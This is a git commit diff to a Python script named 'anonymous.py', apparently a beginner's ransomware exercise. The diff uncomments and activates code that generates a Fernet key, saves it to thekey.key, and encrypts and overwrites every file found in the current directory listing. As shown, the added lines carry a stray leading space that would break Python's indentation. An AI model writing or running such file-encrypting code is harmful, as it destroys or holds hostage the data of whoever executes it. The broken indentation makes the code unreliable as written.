3c41b2aee321cb0e7925d9108681aa82c43be811
PythonPractices1 <68774207+PythonPractices1@users.noreply.github.com>
2022-09-09 16:39:24 +0300

    Update anonymous.py

--- anonymous.py
+++ anonymous.py
@@ -13,15 +13,15 @@ for file in os.listdir():
 
 print(files) 
 
-# key = Fernet.generate_key()
+ key = Fernet.generate_key()
 
-# with open("thekey.key","wb") as thekey:
-#     thekey.write(key)
-# for file in files:
-#     with open(file,"rb") as thefile:
-#         contents = thefile.read()
-#         contents_encrypted = Fernet(key).encrypt(contents)
-#         with open(file,"wb") as thefile:
-#             thefile.write(contents_encrypted)
+ with open("thekey.key","wb") as thekey:
+     thekey.write(key)
+ for file in files:
+     with open(file,"rb") as thefile:
+         contents = thefile.read()
+         contents_encrypted = Fernet(key).encrypt(contents)
+         with open(file,"wb") as thefile:
+             thefile.write(contents_encrypted)
             
 
